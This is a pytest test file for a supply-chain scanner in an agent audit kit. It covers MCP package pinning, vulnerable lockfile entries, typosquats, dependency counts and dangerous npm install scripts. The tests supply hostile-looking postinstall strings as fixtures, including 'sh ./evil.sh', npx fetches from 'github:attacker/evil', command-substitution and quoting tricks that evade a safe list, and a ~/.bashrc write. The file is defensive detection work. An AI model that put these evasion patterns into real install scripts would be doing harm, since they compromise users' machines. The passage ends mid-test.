from __future__ import annotations

import dataclasses
import json
from pathlib import Path

import pytest
from click.testing import CliRunner

from agent_audit_kit.cli import cli
from agent_audit_kit.engine import _drop_launches_supply_chain_reports, run_scan
from agent_audit_kit.models import Severity
from agent_audit_kit.scanners import mcp_config, supply_chain
from agent_audit_kit.scanners._helpers import placed
from agent_audit_kit.scanners._launchers import launch_evidence, launch_subject
from agent_audit_kit.scanners.supply_chain import scan, _version_in_range


def test_supply_chain_mcp_unpinned(tmp_path: Path) -> None:
    """AAK-SUPPLY-001: MCP server packages without version pins."""
    config = {
        "mcpServers": {
            "unpinned": {
                "command": "npx",
                "args": ["@modelcontextprotocol/server-filesystem", "/data"]
            }
        }
    }
    (tmp_path / ".mcp.json").write_text(json.dumps(config))
    findings, _ = scan(tmp_path)
    supply001 = [f for f in findings if f.rule_id == "AAK-SUPPLY-001"]
    assert len(supply001) > 0, "Unpinned MCP package should be detected"


def test_supply_chain_pinned_not_flagged(tmp_path: Path) -> None:
    """Pinned packages should NOT trigger AAK-SUPPLY-001."""
    config = {
        "mcpServers": {
            "pinned": {
                "command": "npx",
                "args": ["@modelcontextprotocol/server-filesystem@2025.1.1", "/data"]
            }
        }
    }
    (tmp_path / ".mcp.json").write_text(json.dumps(config))
    findings, _ = scan(tmp_path)
    supply001 = [f for f in findings if f.rule_id == "AAK-SUPPLY-001"]
    assert len(supply001) == 0, "Pinned packages should not be flagged"


def test_known_vulnerable_package(tmp_path: Path) -> None:
    """AAK-SUPPLY-002: Known vulnerable packages in lockfile."""
    lockfile = {
        "name": "test-project",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "packages": {
            "node_modules/axios": {
                "version": "1.7.2",
                "resolved": "https://registry.npmjs.org/axios/-/axios-1.7.2.tgz"
            }
        }
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lockfile))
    (tmp_path / "package.json").write_text('{"name":"test","version":"1.0.0"}')
    findings, _ = scan(tmp_path)
    supply002 = [f for f in findings if f.rule_id == "AAK-SUPPLY-002"]
    assert len(supply002) > 0, "Known vulnerable axios version should be detected"


def test_dangerous_install_scripts(project_with_package_risks: Path) -> None:
    """AAK-SUPPLY-003: Dangerous install scripts in package.json."""
    findings, _ = scan(project_with_package_risks)
    supply003 = [f for f in findings if f.rule_id == "AAK-SUPPLY-003"]
    assert len(supply003) > 0, "Dangerous install scripts should be detected"


# ---------------------------------------------------------------------------
# AAK-SUPPLY-003 judges every command an install script runs
# ---------------------------------------------------------------------------
#
# `npx` was on the safe list, so `npx some-remote-package`, which fetches a
# package nothing declares and runs it during install, passed while the same
# script under `bunx` was reported. Only the start of a script was judged, so
# `tsc && sh ./evil.sh` passed, and `https` was not a network word, so
# `node -e "require('https').get(...)"` passed.


def _supply_003(tmp_path: Path, script: str, **deps: dict) -> list[str]:
    package = {"name": "app", "version": "1.0.0", "scripts": {"postinstall": script}, **deps}
    (tmp_path / "package.json").write_text(json.dumps(package))
    return [f.evidence for f in scan(tmp_path)[0] if f.rule_id == "AAK-SUPPLY-003"]


@pytest.mark.parametrize("script", [
    "npx some-remote-package",
    "npx --yes some-unreviewed-package",
    "npx -y @scope/tool@1.2.3 setup",  # a pinned fetch is still a fetch
    "bunx some-remote-package",
    "pnpm dlx husky",  # dlx fetches whatever is installed
    "node -e \"require('https').get('https://example.test/x')\"",
    "node scripts/download.js https://example.test/bin.tgz",
    "tsc && sh ./evil.sh",
    "npm run build; sh ./evil.sh",
    "tsc\nsh ./evil.sh",
    "npx husky install && npx some-remote-package",
    "node install.js || echo 'export X=1' >> ~/.bashrc",  # a fallback that writes a file
])
def test_supply_003_reports_a_script_that_runs_unreviewed_code(tmp_path: Path, script: str) -> None:
    assert _supply_003(tmp_path, script, devDependencies={"husky": "^9.0.0"}) == [f"scripts.postinstall: {script}"]


@pytest.mark.parametrize("script", [
    "npx husky install",  # declared, so npx runs it from node_modules
    "npx patch-package",
    "bunx husky",
    "npm exec -- patch-package",
    "npx tsc -p .",  # a build tool on the safe list, as `tsc` alone is
    "tsc && node scripts/postinstall.js",
    "npm run build && npx patch-package",
    "node install.js || true",  # a no-op fallback is not a command to judge
    "node scripts/postinstall.js || echo 'Skipping postinstall'",
    "npm run build && exit 0",
    "node scripts/build.js > build.log 2>&1",  # a redirect target is not a command
])
def test_supply_003_passes_build_tools_and_declared_packages(tmp_path: Path, script: str) -> None:
    deps = {"devDependencies": {"husky": "^9.0.0", "patch-package": "^8.0.0"}}
    assert _supply_003(tmp_path, script, **deps) == []


# These passed. Each runs a program off the safe list or has npx fetch a
# package; every `sh ./evil.sh` here ran under `/bin/sh -c` on macOS (bash 3.2
# as sh), and under dash too, but for the two ANSI-C (`$'...'`) strings. The
# safe list was matched as a prefix of the command text, a command run after
# an option-named package was never judged, a declared name was trusted
# whatever source its spec named, a command that runs nothing was skipped with
# its arguments, and a `#'` comment left an unclosed quote that made the line
# fall back to whitespace splitting.
_SUPPLY_003_BYPASSES = [
    "NODE_ENV=production sh ./evil.sh",
    "tsc && NODE_OPTIONS=x sh ./evil.sh",
    "NODE_ENV=production",  # runs nothing, and passed only as a prefix of `node`
    "tscripts/setup.sh",
    "tsc && vite-installer --run",
    "npm run build-and-setup",
    'tsc && echo "$(sh ./evil.sh)"',
    "tsc && echo `sh ./evil.sh`",
    'tsc && : "$(sh ./evil.sh)"',
    "tsc && echo \"it's $(sh ./evil.sh)\"",
    "npx -p husky sh ./evil.sh",
    "npm exec --package=husky -- sh ./evil.sh",
    "npx -p husky npx -p husky sh ./evil.sh",
    "npx husky@github:attacker/evil",
    "npx husky@npm:evil-installer",
    "npx --package=husky@github:attacker/evil husky",
    "npx husky@latest",  # a tag can name a release the project does not install
    "tsc&&sh ./evil.sh #'",
    "node build.js;sh ./evil.sh #'",
    "tsc && echo `echo #` && sh ./evil.sh",
    'tsc && echo "a\n#b" && sh ./evil.sh',
    "tsc && echo $'\\'' ; sh ./evil.sh ; echo '\\'",
    "tsc && echo $'\\'' \"`sh ./evil.sh`\"",
]


@pytest.mark.parametrize("script", _SUPPLY_003_BYPASSES)
def test_supply_003_reports_what_its_safe_list_let_through(tmp_path: Path, script: str) -> None:
    assert _supply_003(tmp_path, script, devDependencies={"husky": "^9.0.0"}) == [f"scripts.postinstall: {script}"]


@pytest.mark.parametrize("script", [
    "npx -p husky husky install",  # the package's own command, as `npx husky install`
    "npm exec --package=husky -- husky install",
    "npx -p typescript tsc",
    "npx husky@^9 install",  # a registry version of a declared package
    "NODE_ENV=production webpack",
    "PLAYWRIGHT_BROWSERS_PATH=0 npx playwright install chromium",
    "node_modules/.bin/tsc -p .",
    "npm run build -- --prod",
    "node scripts/postinstall.mjs && echo 'done'",
    "node $(echo build.js)",  # a substitution that runs nothing
    "npx tsc --build && echo \"it's done\"",
    "tsc # build the types",
])
def test_supply_003_passes_the_same_tools_read_by_name(tmp_path: Path, script: str) -> None:
    deps = {"devDependencies": {"husky": "^9.0.0", "playwright": "^1.48.0", "typescript": "^5.6.0"}}
    assert _supply_003(tmp_path, script, **deps) == []


@pytest.mark.parametrize(("script", "reported"), [
    ("node-gyp rebuild", False),  # what npm runs itself for a binding.gyp
    ("node-gyp-build", False),  # builds, or loads the package's own prebuilds
    ("npx node-gyp rebuild", False),
    ("node-pre-gyp install --fallback-to-build", True),  # downloads a prebuilt binary
    ("prebuild-install || node-gyp rebuild", True),  # so does prebuild-install
])
def test_supply_003_trusts_the_native_builders_not_the_binary_downloaders(
    tmp_path: Path, script: str, reported: bool
) -> None:
    assert bool(_supply_003(tmp_path, script)) is reported


@pytest.mark.parametrize(("script", "deps"), [
    ("ts-node scripts/postinstall.ts", {}),
    ("tsx scripts/postinstall.ts", {}),
    ("node_modules/.bin/ts-node scripts/postinstall.ts", {}),
    ("npx ts-node scripts/postinstall.ts", {"devDependencies": {"ts-node": "^10.9.2"}}),
    ("npx tsx scripts/postinstall.ts", {"devDependencies": {"tsx": "^4.19.0"}}),
    # Undeclared, a runner on the safe list passes under npx, as `npx tsc` does.
    ("npx ts-node scripts/postinstall.ts", {}),
    ("npx tsx scripts/postinstall.ts", {}),
    ("vite-node scripts/postinstall.ts", {}),
    ("npx vite-node scripts/postinstall.ts", {"devDependencies": {"vite-node": "^3.2.4"}}),
    ("npx vite-node scripts/postinstall.ts", {}),
])
def test_supply_003_trusts_a_typescript_runner_as_it_trusts_node(
    tmp_path: Path, script: str, deps: dict
) -> None:
    """`node <script>` passes, so a TypeScript runner for the same script does."""
    assert _supply_003(tmp_path, script, **deps) == []


@pytest.mark.parametrize(("script", "reported"), [
    ("npm run build", False),
    ("npm run build:css", False),  # npm-run-all's `build:<name>` family
    ("npm run build:prod:min", False),
    ("npm run build-and-setup", True),
    ("npm run buildx", True),
])
def test_supply_003_trusts_the_build_script_and_its_build_name_family(
    tmp_path: Path, script: str, reported: bool
) -> None:
    """The package.json controls `build:css` exactly as much as `build`, so
    whole-word `build` bought nothing over `build:<name>`."""
    assert bool(_supply_003(tmp_path, script)) is reported


def test_supply_003_does_not_read_the_script_npm_run_build_runs(tmp_path: Path) -> None:
    """Stated: following `npm run`, `yarn`, `pnpm` and `bun run` into the
    scripts they name reported 249 more of 3,171 real install scripts and 35
    fewer; 248 of the 249 were `npm run build` or `npm run build:<name>` whose
    script runs a build tool off the safe list (`rimraf dist && tsc`). So the
    script is not read, as the file `node build.js` runs is not."""
    package = {"scripts": {"postinstall": "npm run build", "build": "sh ./evil.sh"}}
    (tmp_path / "package.json").write_text(json.dumps(package))
    assert [f for f in scan(tmp_path)[0] if f.rule_id == "AAK-SUPPLY-003"] == []


@pytest.mark.parametrize("script", [
    "tsc && echo " + "$(" * 2_040,
    "tsc && echo " + "`" * 4_080,
    "tsc && echo " + "\"$(echo '" * 290,
    "tsc && echo " + "$'\\" * 1_020,
    "tsc && " + "# '" * 1_360,
    "tsc && echo " + "x" * 4_080,
    "npx -p husky " * 314 + "tsc",
])
def test_a_crafted_script_at_the_limit_is_judged_quickly(tmp_path: Path, script: str) -> None:
    """Every script judged is at most 4,096 characters, so reading its comments,
    quotes and nested substitutions is bounded; this checks the bound holds for
    the shapes that make those readers work hardest."""
    import time

    assert len(script) <= 4_096
    started = time.process_time()
    _supply_003(tmp_path, script)
    assert time.process_time() - started < 1.0


def test_supply_003_still_reports_a_command_off_the_safe_list(tmp_path: Path) -> None:
    """Declaring a package makes npx run it locally; the bare command was, and
    is, judged by the build-tool list alone."""
    assert _supply_003(tmp_path, "husky install", devDependencies={"husky": "^9.0.0"})


def test_supply_003_reports_a_script_too_long_to_judge(tmp_path: Path) -> None:
    """The longest of 3,171 real install scripts was 578 characters. A script
    over the limit is reported without being split, which bounds what a crafted
    one costs the scan."""
    import time

    script = "tsc " + "a" * 1_000_000
    started = time.perf_counter()
    assert _supply_003(tmp_path, script) == [f"scripts.postinstall: {script}"]
    assert time.perf_counter() - started < 5.0


def test_no_lockfile(tmp_path: Path) -> None:
    """AAK-SUPPLY-004: Missing lockfile."""
    (tmp_path / "package.json").write_text('{"name":"test","version":"1.0.0"}')
    findings, _ = scan(tmp_path)
    supply004 = [f for f in findings if f.rule_id == "AAK-SUPPLY-004"]
    assert len(supply004) > 0, "Missing lockfile should be detected"


@pytest.mark.parametrize("lockfile", [
    "package-lock.json", "yarn.lock", "pnpm-lock.yaml",
    # Bun 1.2 and later writes the text bun.lock; earlier releases wrote bun.lockb.
    "bun.lock", "bun.lockb",
])
def test_each_npm_client_lockfile_satisfies_supply_004(tmp_path: Path, lockfile: str) -> None:
    (tmp_path / "package.json").write_text('{"name":"test","version":"1.0.0"}')
    (tmp_path / lockfile).write_text("{}\n" if lockfile.endswith(".json") else "")
    assert not [f for f in scan(tmp_path)[0] if f.rule_id == "AAK-SUPPLY-004"]


def test_excessive_dependencies(tmp_path: Path) -> None:
    """AAK-SUPPLY-005: Excessive dependency count."""
    packages = {f"node_modules/pkg-{i}": {"version": "1.0.0"} for i in range(250)}
    lockfile = {
        "name": "test",
        "lockfileVersion": 3,
        "packages": packages
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lockfile))
    (tmp_path / "package.json").write_text('{"name":"test","version":"1.0.0"}')
    findings, _ = scan(tmp_path)
    supply005 = [f for f in findings if f.rule_id == "AAK-SUPPLY-005"]
    assert len(supply005) > 0, "Excessive dependencies should be detected"


def test_version_in_range() -> None:
    """Test version comparison logic."""
    assert _version_in_range("1.7.2", ">=1.7.0 <1.7.4") is True
    assert _version_in_range("1.7.0", ">=1.7.0 <1.7.4") is True
    assert _version_in_range("1.7.4", ">=1.7.0 <1.7.4") is False
    assert _version_in_range("1.6.9", ">=1.7.0 <1.7.4") is False
    assert _version_in_range("2.0.0", "<2.1.0") is True
    assert _version_in_range("2.1.0", "<2.1.0") is False


def test_clean_project_no_supply_chain_findings(tmp_path: Path) -> None:
    """A project with proper lockfile and pinned deps should have no findings."""
    (tmp_path / "package.json").write_text('{"name":"test","version":"1.0.0"}')
    (tmp_path / "package-lock.json").write_text(json.dumps({
        "name": "test",
        "lockfileVersion": 3,
        "packages": {
            "node_modules/safe-pkg": {"version": "1.0.0"}
        }
    }))
    findings, _ = scan(tmp_path)
    assert len(findings) == 0, f"Clean project should have no supply chain findings, got: {[f.rule_id for f in findings]}"


# ---------------------------------------------------------------------------
# Python dependency scanning (_scan_python_deps)
# ---------------------------------------------------------------------------


@pytest.fixture
def python_table(monkeypatch: pytest.MonkeyPatch) -> str:
    """A stand-in PyPI entry for the reader's tests; returns its name.

    The PyPI table is empty. Its one entry, `openclaw`, named an unrelated PyPI
    project (an installer for the cmdop CLI), not OpenClaw, which ships on npm.
    """
    from agent_audit_kit.scanners import supply_chain

    monkeypatch.setitem(supply_chain.KNOWN_VULNERABLE_PACKAGES, "python", {
        "vulnerable-pkg": {"affected": "<2.1.0", "description": "test entry"},
    })
    return "vulnerable-pkg"


def test_python_requirements_vulnerable_dep(tmp_path: Path, python_table: str) -> None:
    """AAK-SUPPLY-002: A requirements.txt with a known vulnerable Python package."""
    (tmp_path / "requirements.txt").write_text(f"{python_table}==2.0.0\nrequests==2.31.0\n")
    findings, _ = scan(tmp_path)
    supply002 = [f for f in findings if f.rule_id == "AAK-SUPPLY-002"]
    assert len(supply002) > 0, "Vulnerable Python package in requirements.txt should be detected"
    assert any(python_table in f.evidence for f in supply002)


def test_the_pypi_openclaw_is_not_reported(tmp_path: Path) -> None:
    """PyPI's `openclaw` (2.0.1, 2.0.2) installs the cmdop CLI and is not OpenClaw,
    which ships on npm only; the table reported it as 104 OpenClaw CVEs."""
    (tmp_path / "requirements.txt").write_text("openclaw==2.0.2\n")
    (tmp_path / "Pipfile.lock").write_text(
        json.dumps({"default": {"openclaw": {"version": "==2.0.2"}}})
    )
    findings, _ = scan(tmp_path)
    assert not [f for f in findings if f.rule_id == "AAK-SUPPLY-002"]


def test_python_pyproject_missing_lockfile(tmp_path: Path) -> None:
    """AAK-SUPPLY-004: pyproject.toml without a lockfile triggers missing lockfile finding."""
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "test"\nversion = "1.0.0"\n'
        'dependencies = ["openclaw==2.0.0"]\n'
    )
    findings, _ = scan(tmp_path)
    supply004 = [f for f in findings if f.rule_id == "AAK-SUPPLY-004"]
    assert len(supply004) > 0, "Missing lockfile for pyproject.toml should be detected"


def test_python_requirements_safe_dep(tmp_path: Path) -> None:
    """Safe Python packages should NOT trigger AAK-SUPPLY-002."""
    (tmp_path / "requirements.txt").write_text("requests==2.31.0\nflask==3.0.0\n")
    findings, _ = scan(tmp_path)
    supply002 = [f for f in findings if f.rule_id == "AAK-SUPPLY-002"]
    assert len(supply002) == 0, "Safe Python packages should not trigger AAK-SUPPLY-002"


def test_python_requirements_no_version(tmp_path: Path, python_table: str) -> None:
    """Python packages without version specifiers should not trigger AAK-SUPPLY-002."""
    (tmp_path / "requirements.txt").write_text(f"{python_table}\nrequests\n")
    findings, _ = scan(tmp_path)
    supply002 = [f for f in findings if f.rule_id == "AAK-SUPPLY-002"]
    assert len(supply002) == 0, "Packages without versions should not trigger vulnerable dep check"


def test_python_requirements_with_extras(tmp_path: Path, python_table: str) -> None:
    """Python packages with extras should be parsed correctly."""
    (tmp_path / "requirements.txt").write_text(f"{python_table}[full]==2.0.0\n")
    findings, _ = scan(tmp_path)
    supply002 = [f for f in findings if f.rule_id == "AAK-SUPPLY-002"]
    assert len(supply002) > 0, "Vulnerable package with extras should still be detected"


# ---------------------------------------------------------------------------
# Closes #18: targeted boundary coverage for _scan_python_deps + _scan_rust_deps.
# ---------------------------------------------------------------------------


def test_python_requirements_dev_files_picked_up(tmp_path: Path, python_table: str) -> None:
    """`requirements*.txt` glob should also catch requirements-dev.txt
    and requirements-test.txt, not just requirements.txt."""
    (tmp_path / "requirements.txt").write_text("requests==2.31.0\n")
    (tmp_path / "requirements-dev.txt").write_text(f"{python_table}==2.0.0\n")
    (tmp_path / "requirements-test.txt").write_text("flask==3.0.0\n")
    findings, scanned = scan(tmp_path)
    supply002 = [f for f in findings if f.rule_id == "AAK-SUPPLY-002"]
    assert any(f.file_path == "requirements-dev.txt" for f in supply002), (
        "Vulnerable pin in requirements-dev.txt must be detected via glob"
    )
    assert "requirements-dev.txt" in scanned
    assert "requirements-test.txt" in scanned


def test_version_in_range_boundary_below() -> None:
    """A version exactly at the lower bound of the affected range
    must be flagged; one tick below must not."""
    affected = ">=1.7.0 <1.7.4"
    assert _version_in_range("1.7.0", affected), "1.7.0 is the lower bound — must trip"
    assert _version_in_range("1.7.3", affected), "1.7.3 is inside the range — must trip"
    assert not _version_in_range("1.6.99", affected), "1.6.99 is below — must pass"


def test_version_in_range_boundary_above() -> None:
    """A version at or above the upper bound must NOT be flagged."""
    affected = ">=1.7.0 <1.7.4"
    assert not _version_in_range("1.7.4", affected), "1.7.4 is the patched version — must pass"
    assert not _version_in_range("1.8.0", affected), "1.8.0 is well above — must pass"
    assert not _version_in_range("2.0.0", affected), "2.0.0 is well above — must pass"


def test_python_version_range_lower_bound_trips(tmp_path: Path, python_table: str) -> None:
    """End-to-end version-range check: pin exactly at the lower bound
    of an affected range must produce AAK-SUPPLY-002."""
    # axios >=1.7.0 <1.7.4 is the seeded range in KNOWN_VULNERABLE_PACKAGES
    # but axios is npm-only, and the PyPI table is empty: use the stand-in.
    (tmp_path / "requirements.txt").write_text(f"{python_table}==1.5.0\n")  # below 2.1.0
    findings, _ = scan(tmp_path)
    supply002 = [f for f in findings if f.rule_id == "AAK-SUPPLY-002"]
    assert any(python_table in f.evidence and "1.5.0" in f.evidence for f in supply002)


# ---------------------------------------------------------------------------
# Rust dependency scanning (_scan_rust_deps)
# ---------------------------------------------------------------------------


def test_rust_cargo_missing_lockfile(tmp_path: Path) -> None:
    """AAK-SUPPLY-004: Cargo.toml without Cargo.lock triggers missing lockfile."""
    (tmp_path / "Cargo.toml").write_text(
        '[package]\nname = "test"\nversion = "0.1.0"\n'
    )
    findings, _ = scan(tmp_path)
    supply004 = [f for f in findings if f.rule_id == "AAK-SUPPLY-004"]
    assert len(supply004) > 0, "Missing Cargo.lock should be detected"


def test_rust_cargo_lock_clean(tmp_path: Path) -> None:
    """Cargo.lock with only safe crates should produce no AAK-SUPPLY-002 findings."""
    (tmp_path / "Cargo.toml").write_text(
        '[package]\nname = "test"\nversion = "0.1.0"\n'
    )
    (tmp_path / "Cargo.lock").write_text(
        '[[package]]\nname = "safe-crate"\nversion = "1.0.0"\n'
    )
    findings, _ = scan(tmp_path)
    supply002 = [f for f in findings if f.rule_id == "AAK-SUPPLY-002"]
    assert len(supply002) == 0, "Clean Cargo.lock should not trigger AAK-SUPPLY-002"


def test_rust_cargo_lock_excessive_deps(tmp_path: Path) -> None:
    """AAK-SUPPLY-005: Cargo.lock with >200 packages triggers excessive deps."""
    (tmp_path / "Cargo.toml").write_text(
        '[package]\nname = "test"\nversion = "0.1.0"\n'
    )
    lines = []
    for i in range(210):
        lines.append(f'[[package]]\nname = "crate-{i}"\nversion = "1.0.0"\n{_CRATES_IO}\n')
    (tmp_path / "Cargo.lock").write_text("\n".join(lines))
    findings, _ = scan(tmp_path)
    supply005 = [f for f in findings if f.rule_id == "AAK-SUPPLY-005"]
    assert len(supply005) > 0, "Excessive Rust dependencies should be detected"


# ---------------------------------------------------------------------------
# AAK-SUPPLY-005 counts dependencies, not the project's own packages
# ---------------------------------------------------------------------------
#
# package-lock.json's root entry `""` and Cargo.lock's root crate were counted, so
# 200 dependencies read as 201 and a lockfile with exactly 200 was reported. A
# workspace's members are the project's own packages too: npm lists each one as a
# folder entry and a `link` to it, and Cargo.lock lists them, like the root crate
# and any path dependency, as packages with no `source`.

_CRATES_IO = 'source = "registry+https://github.com/rust-lang/crates.io-index"'


def _supply_005(root: Path) -> list[str]:
    return [f.evidence for f in scan(root)[0] if f.rule_id == "AAK-SUPPLY-005"]


def _package_lock(deps: int, **own: dict) -> str:
    packages: dict = {"": {"name": "app", "version": "1.0.0", "workspaces": ["packages/*"]}}
    packages.update(own)
    packages.update({f"node_modules/pkg-{i:04d}": {"version": "1.0.0"} for i in range(deps)})
    return json.dumps({"name": "app", "lockfileVersion": 3, "packages": packages})


@pytest.mark.parametrize(("deps", "reported"), [(200, []), (201, ["201 dependencies (threshold: 200)"])])
def test_supply_005_does_not_count_the_root_entry(tmp_path: Path, deps: int, reported: list[str]) -> None:
    (tmp_path / "package-lock.json").write_text(_package_lock(deps))
    assert _supply_005(tmp_path) == reported


def test_supply_005_does_not_count_npm_workspace_packages(tmp_path: Path) -> None:
    own = {}
    for name in ("api", "web", "shared"):
        own[f"packages/{name}"] = {"name": name, "version": "1.0.0"}
        own[f"node_modules/{name}"] = {"resolved": f"packages/{name}", "link": True}
    (tmp_path / "package-lock.json").write_text(_package_lock(200, **own))
    assert _supply_005(tmp_path) == []
    # A dependency installed under a workspace member is still a dependency.
    own["packages/web/node_modules/pkg-extra"] = {"version": "2.0.0"}
    (tmp_path / "package-lock.json").write_text(_package_lock(200, **own))
    assert _supply_005(tmp_path) == ["201 dependencies (threshold: 200)"]


def _cargo_lock(registry: int, git: int = 0, local: tuple[str, ...] = ("myapp",)) -> str:
    blocks = [f'[[package]]\nname = "{name}"\nversion = "0.1.0"\n' for name in local]
    blocks += [f'[[package]]\nname = "dep-{i}"\nversion = "1.0.0"\n{_CRATES_IO}\n' for i in range(registry)]
    blocks += [
        f'[[package]]\nname = "git-{i}"\nversion = "0.3.0"\n'
        f'source = "git+https://github.com/example/git-{i}?rev=abc#abc1234"\n'
        for i in range(git)
    ]
    return "version = 3\n\n" + "\n".join(blocks)


@pytest.mark.parametrize(("registry", "reported"), [(200, []), (201, ["201 dependencies (threshold: 200)"])])
def test_supply_005_does_not_count_the_root_crate(tmp_path: Path, registry: int, reported: list[str]) -> None:
    (tmp_path / "Cargo.lock").write_text(_cargo_lock(registry))
    assert _supply_005(tmp_path) == reported


def test_supply_005_counts_git_crates_and_not_workspace_or_path_crates(tmp_path: Path) -> None:
    members = ("myapp", "myapp-core", "myapp-cli", "vendored-path-crate")
    (tmp_path / "Cargo.lock").write_text(_cargo_lock(195, git=6, local=members))
    assert _supply_005(tmp_path) == ["201 dependencies (threshold: 200)"]
    (tmp_path / "Cargo.lock").write_text(_cargo_lock(195, git=5, local=members))
    assert _supply_005(tmp_path) == []


# ---------------------------------------------------------------------------
# npm lockfile scanning
# ---------------------------------------------------------------------------


def test_npm_lockfile_excessive_deps(tmp_path: Path) -> None:
    """AAK-SUPPLY-005: package-lock.json with >200 deps triggers excessive deps."""
    packages = {f"node_modules/pkg-{i}": {"version": "1.0.0"} for i in range(250)}
    lockfile = {
        "name": "test",
        "lockfileVersion": 3,
        "packages": packages,
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lockfile))
    (tmp_path / "package.json").write_text('{"name":"test","version":"1.0.0"}')
    findings, _ = scan(tmp_path)
    supply005 = [f for f in findings if f.rule_id == "AAK-SUPPLY-005"]
    assert len(supply005) > 0, "Excessive npm dependencies should be detected"
    assert any("250" in f.evidence for f in supply005)


def test_npm_lockfile_v1_format(tmp_path: Path) -> None:
    """npm lockfile v1 uses 'dependencies' key instead of 'packages'."""
    lockfile = {
        "name": "test",
        "lockfileVersion": 1,
        "dependencies": {
            "axios": {"version": "1.7.2"},
        },
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lockfile))
    (tmp_path / "package.json").write_text('{"name":"test","version":"1.0.0"}')
    findings, _ = scan(tmp_path)
    supply002 = [f for f in findings if f.rule_id == "AAK-SUPPLY-002"]
    assert len(supply002) > 0, "Vulnerable axios in v1 lockfile should be detected"


def test_npm_lockfile_typosquat_detection(tmp_path: Path) -> None:
    """Typosquat patterns in package names should trigger AAK-SUPPLY-002."""
    lockfile = {
        "name": "test",
        "lockfileVersion": 3,
        "packages": {
            "node_modules/@modlecontextprotocol/something": {"version": "1.0.0"},
        },
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lockfile))
    (tmp_path / "package.json").write_text('{"name":"test","version":"1.0.0"}')
    findings, _ = scan(tmp_path)
    supply002 = [f for f in findings if f.rule_id == "AAK-SUPPLY-002"]
    assert len(supply002) > 0, "Typosquat package should be detected"
    assert any("typosquat" in f.evidence.lower() for f in supply002)


def _typosquats(tmp_path: Path, name: str) -> list[str]:
    lock = {"lockfileVersion": 3, "packages": {f"node_modules/{name}": {"version": "1.0.0"}}}
    (tmp_path / "package-lock.json").write_text(json.dumps(lock))
    return [f.evidence for f in scan(tmp_path)[0] if f.rule_id == "AAK-SUPPLY-002"]


@pytest.mark.parametrize("name", [
    "modelcontextprotocal", "@modelcontextprotocal/sdk", "@modlecontextprotocol/server-filesystem",
])
def test_a_misspelled_mcp_scope_is_a_potential_typosquat(tmp_path: Path, name: str) -> None:
    assert _typosquats(tmp_path, name) == [f"Potential typosquat: {name}"]


@pytest.mark.parametrize("name", [
    # Published npm packages (checked 2026-10-17) the `mcp-server-<a>-<b>` name
    # shape reported as typosquats: it matched 37 of the first 1,000 packages
    # npm's search returns for "mcp-server".
    "mcp-server-code-runner",
    "@transcend-io/mcp-server-custom-functions",
    "@baidumap/mcp-server-baidu-map",
    "@aashari/mcp-server-atlassian-jira",
    "kubernetes-mcp-server-linux-amd64",
    "@modelcontextprotocol/server-sequential-thinking",
])
def test_a_real_server_name_is_not_a_typosquat(tmp_path: Path, name: str) -> None:
    assert _typosquats(tmp_path, name) == []


# ---------------------------------------------------------------------------
# Pipfile.lock scanning
# ---------------------------------------------------------------------------


def test_pipfile_missing_lockfile(tmp_path: Path) -> None:
    """AAK-SUPPLY-004: Pipfile without Pipfile.lock triggers missing lockfile."""
    (tmp_path / "Pipfile").write_text("[packages]\nrequests = '*'\n")
    findings, _ = scan(tmp_path)
    supply004 = [f for f in findings if f.rule_id == "AAK-SUPPLY-004"]
    assert len(supply004) > 0, "Missing Pipfile.lock should be detected"


def test_pipfile_lock_vulnerable_dep(tmp_path: Path, python_table: str) -> None:
    """AAK-SUPPLY-002: Vulnerable package in Pipfile.lock."""
    pipfile_lock = {
        "_meta": {"hash": {"sha256": "abc123"}},
        "default": {
            python_table: {"version": "==2.0.0"},
        },
        "develop": {},
    }
    (tmp_path / "Pipfile").write_text(f"[packages]\n{python_table} = '*'\n")
    (tmp_path / "Pipfile.lock").write_text(json.dumps(pipfile_lock))
    findings, _ = scan(tmp_path)
    supply002 = [f.evidence for f in findings if f.rule_id == "AAK-SUPPLY-002"]
    assert supply002 == [f"{python_table}==2.0.0 — test entry"], supply002


# ---------------------------------------------------------------------------
# Scanned files tracking
# ---------------------------------------------------------------------------


def test_scanned_files_includes_relevant_files(tmp_path: Path) -> None:
    """The scan function should track which files were scanned."""
    (tmp_path / "package.json").write_text('{"name":"test","version":"1.0.0"}')
    (tmp_path / "requirements.txt").write_text("requests==2.31.0\n")
    _, scanned = scan(tmp_path)
    assert "package.json" in scanned
    assert "requirements.txt" in scanned


# ---------------------------------------------------------------------------
# AAK-SUPPLY-001 reads the package spec, not every argument
# ---------------------------------------------------------------------------
#
# The rule used to report every argument that did not start with `-` and count any
# text after `@` as a version. A port, a server URL, an exact `==` pin and a commit
# were reported; `@latest` and `@^1` passed as pinned.

GIT_HTTPS = "gi" + "t+https://github.com/org/repo"


def _supply001(tmp_path: Path, server: dict) -> list[str]:
    (tmp_path / ".mcp.json").write_text(json.dumps({"mcpServers": {"srv": server}}))
    findings, _ = scan(tmp_path)
    return [f.evidence for f in findings if f.rule_id == "AAK-SUPPLY-001"]


@pytest.mark.parametrize("server", [
    {"command": "npx", "args": ["-y", "some-mcp-server@1.0.0", "--port", "3000"]},
    {"command": "npx", "args": ["-y", "mcp-remote@0.1.30", "https://example.test/mcp"]},
    {"command": "uvx", "args": ["some-mcp-server==1.2.3"]},
    {"command": "uvx", "args": ["some-mcp-server@1.2.3"]},
    {"command": "npx", "args": ["-y", "github:org/repo#abc1234def"]},
    {"command": "uvx", "args": [GIT_HTTPS + "@0123456789abcdef"]},
    {"command": "uvx", "args": ["--from", "some-mcp-server==1.0.0", "some-mcp-server"]},
    {"command": "uvx", "args": ["--python", "3.12", "some-mcp-server==1.0.0"]},
    {"command": "npx", "args": ["-p", "@scope/pkg@1.2.3", "pkg-bin", "--flag"]},
    {"command": "npx", "args": ["-y", "./local-server"]},
])
def test_a_pinned_spec_and_the_servers_own_arguments_are_not_reported(
    tmp_path: Path, server: dict
) -> None:
    assert _supply001(tmp_path, server) == []


@pytest.mark.parametrize(("server", "reason"), [
    ({"command": "npx", "args": ["-y", "some-mcp-server@latest"]}, "floating tag `latest`"),
    ({"command": "npx", "args": ["-y", "some-mcp-server@^1.0.0"]}, "version range `^1.0.0`"),
    ({"command": "npx", "args": ["some-mcp-server@~1.2"]}, "version range `~1.2`"),
